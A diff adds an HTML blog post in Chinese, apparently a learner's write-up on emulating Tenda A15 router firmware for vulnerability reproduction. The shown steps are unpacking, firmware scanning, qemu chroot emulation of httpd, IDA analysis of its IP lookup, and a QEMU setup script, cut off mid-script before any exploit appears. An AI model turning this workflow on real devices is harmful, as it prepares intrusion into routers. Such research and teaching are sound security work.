@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Tenda A15 固件模拟与漏洞复现01 前言最近也是准备朝着实战方向进军，规划每周都复现一些漏洞，实战确实和CTF差别很大，打CTF的时候，很少用到网络上的知识，基本上都是纯粹的二进制漏洞，但是实战的时候发现自己真是个“偏科生”一点关系到一点web方面的知识，就卡住了，这下终于理解以前学习逆向的学长为什么到最后都是全栈选手了 02固件解包固件下载地址 固件下载好之后对于我们这些初出茅庐的新手来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT漏洞挖掘初体验-Tenda A15">
+<meta property="og:url" content="http://example.com/2025/04/03/IOT%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E4%BD%93%E9%AA%8C-Tenda-A15/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="Tenda A15 固件模拟与漏洞复现01 前言最近也是准备朝着实战方向进军，规划每周都复现一些漏洞，实战确实和CTF差别很大，打CTF的时候，很少用到网络上的知识，基本上都是纯粹的二进制漏洞，但是实战的时候发现自己真是个“偏科生”一点关系到一点web方面的知识，就卡住了，这下终于理解以前学习逆向的学长为什么到最后都是全栈选手了 02固件解包固件下载地址 固件下载好之后对于我们这些初出茅庐的新手来">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202902140.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203513118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203909240.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204201390.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204732152.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403205848830.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403210521250.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211309565.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211423338.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211617368.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213223679.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213322564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220001392.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220113012.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220234903.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403233420135.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403234633289.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235024376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235342842.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235921306.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000347583.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000707382.png">
+<meta property="article:published_time" content="2025-04-03T11:00:36.000Z">
+<meta property="article:modified_time" content="2025-04-13T11:48:22.026Z">
+<meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png">
+  
+  
+  
+  <title>IOT漏洞挖掘初体验-Tenda A15 - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="IOT漏洞挖掘初体验-Tenda A15"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-03 19:00" pubdate>
+          2025年4月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">IOT漏洞挖掘初体验-Tenda A15</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Tenda-A15-固件模拟与漏洞复现"><a href="#Tenda-A15-固件模拟与漏洞复现" class="headerlink" title="Tenda A15 固件模拟与漏洞复现"></a>Tenda A15 固件模拟与漏洞复现</h1><h2 id="01-前言"><a href="#01-前言" class="headerlink" title="01 前言"></a>01 前言</h2><p>最近也是准备朝着实战方向进军，规划每周都复现一些漏洞，实战确实和CTF差别很大，打CTF的时候，很少用到网络上的知识，基本上都是纯粹的二进制漏洞，但是实战的时候发现自己真是个“偏科生”一点关系到一点web方面的知识，就卡住了，这下终于理解以前学习逆向的学长为什么到最后都是全栈选手了</p>
+<h2 id="02固件解包"><a href="#02固件解包" class="headerlink" title="02固件解包"></a>02固件解包</h2><p><a target="_blank" rel="noopener" href="https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip">固件下载地址</a></p>
+<p>固件下载好之后对于我们这些初出茅庐的新手来说，只能选择binwalk3进行一键解包，简直不要太亲民。但是要是遇见没法一键解包的情况目前还不知道怎么处理，到时候自求多福吧</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202726384.png" srcset="/img/loading.gif" lazyload alt="image-20250403202726384"></a></p>
+<p>再文件夹中找到文件系统</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SH">find . -<span class="hljs-built_in">type</span> d -iname <span class="hljs-string">&quot;*root*&quot;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202902140.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403202902140.png" srcset="/img/loading.gif" lazyload alt="image-20250403202902140"></a></p>
+<p>这就是我们需要的东西，由于目录路径一般比较深，可以把文件系统copy到方便找打的地方，后边要经常用</p>
+<p>然后就是查看一下IOT设备框架了，直接找到bin中的busybx，发现是mipsel</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203513118.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203513118.png" srcset="/img/loading.gif" lazyload alt="image-20250403203513118"></a></p>
+<p>这样下来我们就做好了基础的准备</p>
+<h2 id="03-信息收集"><a href="#03-信息收集" class="headerlink" title="03 信息收集"></a>03 信息收集</h2><p>都说漏洞挖掘犹如大海捞针，如果自己一个一个文件看的话，可能效率会很低，这时候都需要用一些工具，来进行自动化分析或者信息收集，这次我只用的是入门级别工具firmwalker，直接开扫</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203909240.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403203909240.png" srcset="/img/loading.gif" lazyload alt="image-20250403203909240"></a></p>
+<p>可以发现WEB服务是httpd</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204201390.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204201390.png" srcset="/img/loading.gif" lazyload alt="image-20250403204201390"></a></p>
+<h2 id="04-分析启动项"><a href="#04-分析启动项" class="headerlink" title="04 分析启动项"></a>04 分析启动项</h2><p>再目录etc_ro中有init.d目录，其中的文件就是启动项</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204732152.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403204732152.png" srcset="/img/loading.gif" lazyload alt="image-20250403204732152"></a></p>
+<p>这些操作我们能执行的都要执行一下，要不一会模拟运行就会出问题呢（别问我怎么知道的😭）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># 创建所有必要的目录（基于当前目录 ./）</span><br><span class="hljs-built_in">mkdir</span> -p ./var/etc<br><span class="hljs-built_in">mkdir</span> -p ./var/media<br><span class="hljs-built_in">mkdir</span> -p ./var/webroot<br><span class="hljs-built_in">mkdir</span> -p ./var/etc/iproute<br><span class="hljs-built_in">mkdir</span> -p ./var/run<br><span class="hljs-built_in">mkdir</span> -p ./etc/udhcpc<br><span class="hljs-built_in">mkdir</span> -p ./var/debug<br><span class="hljs-built_in">mkdir</span> -p ./dev/pts<br><span class="hljs-built_in">mkdir</span> -p ./var/ppp<br><span class="hljs-built_in">mkdir</span> -p ./tmp<br><br><span class="hljs-comment"># 复制文件（从 ./etc_ro 和 ./webroot_ro 到目标目录）</span><br><span class="hljs-built_in">cp</span> -rf ./etc_ro/* ./etc/<br><span class="hljs-built_in">cp</span> -rf ./webroot_ro/* ./var/webroot <span class="hljs-comment">#这个就是部署web服务</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403205848830.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403205848830.png" srcset="/img/loading.gif" lazyload alt="image-20250403205848830"></a></p>
+<h2 id="04用户模拟运行"><a href="#04用户模拟运行" class="headerlink" title="04用户模拟运行"></a>04用户模拟运行</h2><p>我们直接运行一下启动项看看怎么个事</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-built_in">cp</span> $(<span class="hljs-built_in">which</span> qemu-mipsel-static) ./<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./bin/httpd<br><br><br></code></pre></td></tr></table></figure>
+
+<p>成功运行但是ip貌似不对</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403210521250.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403210521250.png" srcset="/img/loading.gif" lazyload alt="image-20250403210521250"></a></p>
+<p>IDA打开二进制文件分析一下，ip到底是怎么获取的</p>
+<p>字符串查找发现发现有用信息</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211309565.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211309565.png" srcset="/img/loading.gif" lazyload alt="image-20250403211309565"></a></p>
+<p>向上查看赋值情况，为函数参数赋值，交叉引用向上继续查</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211423338.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211423338.png" srcset="/img/loading.gif" lazyload alt="image-20250403211423338"></a></p>
+<p>传入的是bss段地址，继续交叉引用查看赋值</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211617368.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403211617368.png" srcset="/img/loading.gif" lazyload alt="image-20250403211617368"></a></p>
+<p>发现再main函数中发现赋值情况，代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C">GetValue(<span class="hljs-string">&quot;sys.workmode&quot;</span>, value); <span class="hljs-comment">//获取系统工作模式</span><br><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(value, <span class="hljs-string">&quot;apclient&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(value, <span class="hljs-string">&quot;ap&quot;</span>) ) <span class="hljs-comment">//可能代表无线 AP 模式</span><br>&#123;<br>  <span class="hljs-built_in">strncpy</span>(g_lan_ip, <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">0x10</span>u);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  lan_ifname = ifaddrs_get_lan_ifname(); <span class="hljs-comment">//获取 LAN 口的网络接口名称 --只检查 br0 或 eth0</span><br>  <span class="hljs-keyword">if</span> ( ifaddrs_get_ifip(lan_ifname, br0IP) &lt; <span class="hljs-number">0</span> ) <span class="hljs-comment">//获取该网卡的 IP 地址</span><br>  &#123;<br>    <span class="hljs-comment">//获取失败</span><br>    GetValue(<span class="hljs-string">&quot;lan.ip&quot;</span>, value);<br>    <span class="hljs-built_in">strcpy</span>(g_lan_ip, value);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-comment">//获取成功</span><br>    <span class="hljs-built_in">strcpy</span>(g_lan_ip, br0IP);<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>分析到这函数的执行流程就很清楚了</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XL"><span class="hljs-function"><span class="hljs-title">main</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">initWebs</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">websOpenServer</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">websOpenListen</span> -&gt;</span> socketOpenConnection<br><br><br></code></pre></td></tr></table></figure>
+
+<p>解决办法就是创建一个能检测到的网卡推荐创建br0</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> add name br0 <span class="hljs-built_in">type</span> bridge   <span class="hljs-comment"># 创建 br0 网桥</span><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> br0 up                 <span class="hljs-comment"># 启动 br0</span><br><span class="hljs-built_in">sudo</span> ip addr add 192.168.0.1/24 dev br0  <span class="hljs-comment"># 给 br0 配置 IP（可选）</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>成功解决</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213223679.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213223679.png" srcset="/img/loading.gif" lazyload alt="image-20250403213223679"></a></p>
+<p>用浏览器即可进入WEB界面</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213322564.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213322564.png" srcset="/img/loading.gif" lazyload alt="image-20250403213322564"></a></p>
+<h2 id="05-系统模拟运行"><a href="#05-系统模拟运行" class="headerlink" title="05 系统模拟运行"></a>05 系统模拟运行</h2><p>下面展示一下系统模拟运行</p>
+<p>自己再网上总结了很多脚本，自己稍加改动直接一键运行，简直不要太爽（就喜欢这种感觉哈哈），默认账户和密码都是root</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># ==============================================</span><br><span class="hljs-comment"># QEMU MIPSEL Debian Squeeze 虚拟机安装脚本（带校验功能）</span><br><span class="hljs-comment"># 适用于嵌入式开发/逆向工程环境搭建</span><br><span class="hljs-comment"># ==============================================</span><br><br><span class="hljs-comment"># 配置参数</span><br>WORK_DIR=<span class="hljs-string">&quot;debian-mipsel-qemu&quot;</span><br>IMAGE_FILE=<span class="hljs-string">&quot;debian_squeeze_mipsel_standard.qcow2&quot;</span><br>KERNEL_FILE=<span class="hljs-string">&quot;vmlinux-2.6.32-5-4kc-malta&quot;</span><br>START_SCRIPT=<span class="hljs-string">&quot;start.sh&quot;</span><br><br><span class="hljs-comment"># 1. 创建工作目录（如果不存在）</span><br><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建目录 <span class="hljs-variable">$WORK_DIR</span>...&quot;</span><br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;无法进入目录 <span class="hljs-variable">$WORK_DIR</span>&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 2. 下载镜像文件（如果不存在）</span><br><span class="hljs-function"><span class="hljs-title">download_file</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> url=<span class="hljs-variable">$1</span><br>    <span class="hljs-built_in">local</span> file=<span class="hljs-variable">$2</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在下载 <span class="hljs-variable">$file</span>...&quot;</span><br>        wget <span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span> -O <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;下载失败&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> 已存在，跳过下载&quot;</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br>download_file <span class="hljs-string">&quot;https://people.debian.org/~aurel32/qemu/mipsel/<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span><br>download_file <span class="hljs-string">&quot;https://people.debian.org/~aurel32/qemu/mipsel/<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span><br><br><span class="hljs-comment"># 3. 生成或覆盖启动脚本</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成启动脚本...&quot;</span><br><span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">sudo</span> qemu-system-mipsel \<br>    -nographic \<br>    -M malta \<br>    -kernel vmlinux-2.6.32-5-4kc-malta \<br>    -hda debian_squeeze_mipsel_standard.qcow2 \<br>    -net nic,macaddr=52:54:00:12:34:56 \<br>    -net tap,ifname=tap0,script=no,downscript=no \<br>    -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span><br>EOF<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span><br><br><span class="hljs-comment"># 4. 检查是否所有文件都已准备就绪</span><br>required_files=(<span class="hljs-string">&quot;<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span>)<br>missing_files=()<br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span 